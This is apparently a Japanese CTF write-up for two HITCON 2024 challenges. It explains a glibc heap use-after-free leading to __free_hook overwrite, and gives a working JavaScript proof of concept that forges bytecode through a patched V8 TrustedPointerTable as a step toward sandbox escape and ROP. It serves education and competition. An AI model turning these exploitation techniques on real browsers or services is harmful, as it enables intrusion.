---
layout: page
title: "hitcon2024 setjmp, v8-sbx-re"
date: 2024-07-15 00:00:00 -0000
---

少しだけ時間が取れて、一番簡単なpwnのsetjmpと、やさしめのv8の問題を解きました。残りの時間はhalloweenを眺めたり、reescapeを眺めたりしていました。

# setjmp
全問題で一番回答数が多かったようです。libcはバージョン2.31ですので、safe linkingなし、`__free_hook`が使えます。ソースはありません。

根っこのチャンクを作って、ポインタをスタックで持って、以降ユーザを登録したらリストに追加していきます。

```c
  root_chunk = create_root_chunk();

...

  case 0:
    longjmp(DAT_00104050_before_menu,1);
  case 1:
    longjmp(DAT_00104060_before_restart,1);
  case 2:
    new_user(root_chunk);
    break;
  case 3:
    del_user(root_chunk);
    break;
  case 4:
    change_pass(root_chunk);
    break;
  case 5:
    view_user(root_chunk);
    break;
  default:
```

ユーザ情報を入れるチャンクの構造体は以下の通りです。二重リンクリストになっています。ポインタとパスワードが隣接しているので、ヒープがリークしそうです。

```c
struct mycred {
    uchar[8] name,
    uchar[8] password,
    struct mycred* prev,
    struct mycred* next,
}
```

ユーザの追加は、根っこのチャンクと、新しいチャンクを二重リンクにしてつなげます。これは問題なし。

```c
struct mycred * new_user(struct mycred *root_cred)

{
  struct mycred *new_cred;
  
  new_cred = (struct mycred *)malloc(0x20);
  get_bytes_with_prompt("username > ",new_cred,8);
  get_bytes_with_prompt("password > ",new_cred->password,8);
  new_cred->next = root_cred->next;
  root_cred->next->prev = new_cred;
  root_cred->next = new_cred;
  new_cred->prev = root_cred;
  return new_cred;
}
```

ユーザの削除が少し問題です。unlinkの処理自体は良いですが、ポインタを解放した後に消していません。普通の削除処理では問題ないですが、最後のチャンクは消しても残り、UAFになります。

```c
void del_user(struct mycred *root_cred)

{
  struct mycred *ptr;
  
  ptr = (struct mycred *)get_user_by_name(root_cred);
  if (ptr != (struct mycred *)0x0) {
    ptr->prev->next = ptr->next;
    ptr->next->prev = ptr->prev;
    free(ptr);
  }
  return;
}
```

あとはきれいな関数たちです。+8にあるパスワードを変更するだけの`change_pass`、根っこのチャンクが見つかるまでひたすら内容を出力する`view_user`です。`view_user`はAARで使いますが、根っこにつなげておかないとクラッシュします。

```c
void change_pass(undefined8 param_1)

{
  struct mycred *ptr;
  
  ptr = (struct mycred *)get_user_by_name(param_1);
  if (ptr != (struct mycred *)0x0) {
    get_bytes_with_prompt("password > ",ptr->password,8);
  }
  return;
}
```

```c
void view_user(struct mycred *root_chunk)

{
  struct mycred *cursor;
  
  cursor = root_chunk;
  do {
    printf("%s: %s\n",cursor,cursor->password);
    cursor = cursor->next;
  } while (cursor != root_chunk);
  return;
}
```

根っこのチャンクをUAFにした後、パスワードを変更することで解放済みチャンクのkeyの部分を変えられるため、再度該当チャンクを開放することができます。

ヒープのリークとこれを組み合わせることで、以下のようにオーバーラップさせて配置して、AARWを作ります。

```
victim   --> | victim.name    | victim.pw      |
fake_root--> | victim.prev    | victim.next    |   
             | fake_root.prev | fake_root.next |  
```

- AAW:
  1. fake_root のパスワードを変更することで victim.nextを `書きたいアドレス-8`に書き換える。
  2. `書きたいアドレス-8`にある値をユーザ名にしてchange_passを呼び、書きたい値をパスワードとして入力する。
- AAR: 
  1. AAWで `読みたいアドレス+0x18`にfake_rootのアドレスを入れる。
  2. fake_root のパスワードを変更することでvictim.nextを読みたいアドレスに書き換える。
  3. `view_user`で読みたい値を表示する。fake_root --> victim --> target --> fake_root とつながり、エラーにならない。

あとはlibcをリークして、`__free_hook`を書き換えて、シェルを立ち上げます。

exploitは[ここ](https://github.com/jt00000/ctf.writeup/blob/master/hitcon2024/setjmp/solve.py)です。

jmpシリーズに触れずに終わってしまいました。

# V8 SBX Revenge

パッチの主要部は以下の通りです。
- 一度だけ、TrustedPointerTableを書き換えられる
- バイナリ本体のアドレスの上位32bitをリークできる

```cpp
+// Sandbox.modifyTrustedPointerTable(handle, pointer, tag) -> Bool
+void SandboxModifyTrustedPointerTable(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  static int times = 0;
+
+  if (times == 1) {
+    info.GetReturnValue().Set(false);
+    return;
+  }
+
+  DCHECK(ValidateCallbackInfo(info));
+
+  if (info.Length() != 3) {
+    info.GetReturnValue().Set(false);
+    return;
+  }
+
+  v8::Isolate* isolate = info.GetIsolate();
+  Local<v8::Context> context = isolate->GetCurrentContext();
+
+  Local<v8::Integer> handle, pointer, tag;
+  if (!info[0]->ToInteger(context).ToLocal(&handle) ||
+      !info[1]->ToInteger(context).ToLocal(&pointer) ||
+      !info[2]->ToInteger(context).ToLocal(&tag)) {
+    info.GetReturnValue().Set(false);
+    return;
+  }
+
+  TrustedPointerTable& table = reinterpret_cast<Isolate*>(isolate)->trusted_pointer_table();
+
+  table.Set((TrustedPointerHandle)handle->Value(), pointer->Value(), (IndirectPointerTag)tag->Value());
+
+  times += 1;
+  info.GetReturnValue().Set(true);
+}
+
+// Sandbox.H32BinaryAddress
+void SandboxGetH32BinaryAddress(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  DCHECK(ValidateCallbackInfo(info));
+  double h32_binary_addr = (double)((unsigned long long int)&SandboxGetH32BinaryAddress >> 32 << 32);
+  info.GetReturnValue().Set(v8::Number::New(info.GetIsolate(), h32_binary_addr));
+}
+
```

v8に長らく触れていなかったうちに、サンドボックス内からポインタが根こそぎなくなっていることを確認してびっくりしました。代わりにTrustedPointerTableで管理されて、インデックスでアクセスが許可される仕組みになっているようです。

SandboxAPIが使えるときは、[ここ](https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution)の方法を何度か使っています。

ignitionで生成されるバイトコードを変更するとリークやROPにつなげるのですが、このバイトコードもTrustedPointerTableで管理されていて触れなくなっています。しかし逆に言うと、このテーブルをサンドボックス内に向けて、同じ内容を用意できれば、同じ手法が使えるのではと考えて、これを確認しました。以下で上手く動きました。

```js
BigInt.prototype.hex = function () { return "0x"+this.toString(16); };
Number.prototype.hex = function () { return "0x"+this.toString(16); };

addrof = (obj) => Sandbox.getAddressOf(obj);
var smv = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(smv);

aar1 = (of) => { return dv.getUint8(of, true) };
aar4 = (of) => { return dv.getUint32(of, true) };
aar8 = (of) => { return dv.getBigUint64(of, true) };

aaw1 = (of, v) => { return dv.setUint8(of, v, true) };
aaw4 = (of, v) => { return dv.setUint32(of, v, true) };
aaw8 = (of, v) => { return dv.setBigUint64(of, v, true) };

hax = (a, b) => { return a + b + 1 };

var cage_base = aar8(0x58) - 0x68n;
console.log('cage_base: ', cage_base.hex());

var ofs_fake_bytecode = 0x46a40;
var addr_fake_bytecode = cage_base + BigInt(ofs_fake_bytecode);

// compile function first
hax();

/* copy from real bytecode to fake bytecode
0xb600004030c:  0x00000949      0x00400600      0x00000012      0x00194bdd
0xb600004031c:  0x00000000      0x00000011      0x00000019      0x00000000
0xb600004032c:  0x00000003      0x00000000      0x033b040b      0x01014700
0xb600004033c:  0x000000af      0x00000595      0x00000004      0x00194185
0xb600004034c:  0x000253b9      0x00000949      0x00400800      0x0000002e
*/

aaw4(ofs_fake_bytecode+0x00, 0x949);
aaw4(ofs_fake_bytecode+0x04, 0x400600);
aaw4(ofs_fake_bytecode+0x08, 0x12);
aaw4(ofs_fake_bytecode+0x0c, 0x194bdd);
aaw4(ofs_fake_bytecode+0x10, 0);
aaw4(ofs_fake_bytecode+0x14, 0x11);
aaw4(ofs_fake_bytecode+0x18, 0x19);
aaw4(ofs_fake_bytecode+0x1c, 0);
aaw4(ofs_fake_bytecode+0x20, 3);
aaw4(ofs_fake_bytecode+0x24, 0);
aaw4(ofs_fake_bytecode+0x28, 0x033b040b);
aaw4(ofs_fake_bytecode+0x2c, 0x01014700);
aaw4(ofs_fake_bytecode+0x30, 0xaf);

// modify pointer to fake_bytecode
Sandbox.modifyTrustedPointerTable(0x2003 << 9, 0, Number(addr_fake_bytecode+1n));
```

```
$ ./d8 ./writeup.js --shell
cage_base:  0x287f00000000
V8 version 12.8.163
d8> hax()
NaN
d8>
```

逆に適当にバイトコードを変えると落ちるので、ちゃんと通っているようです。あとは同じ手順でコード実行まで持っていきます。バイトコードはハンドラのテーブルなどを確認して適切に変更します。例えば、リターンのバイトコードは参照したwriteupでは0xaaでしたが、このバージョンでは0xafになっています。

1. インデックスをずらして、v8の下位32ビットをリークし上位ビットと組み合わせてリークする（smiで出てくるので1/2くらいで失敗してそう）
2. 再びインデックスをずらして、rbpを書いてすぐリターンするようにする
3. オブジェクトを引数にして関数を呼んでROP

exploitは[ここ](https://github.com/jt00000/ctf.writeup/blob/master/hitcon2024/v8sbx-re/exploit.js)です。知ってる内容がたまたま当たって良かったです。wasmを使った解法もあるようなのでよく見ておきたいと思います。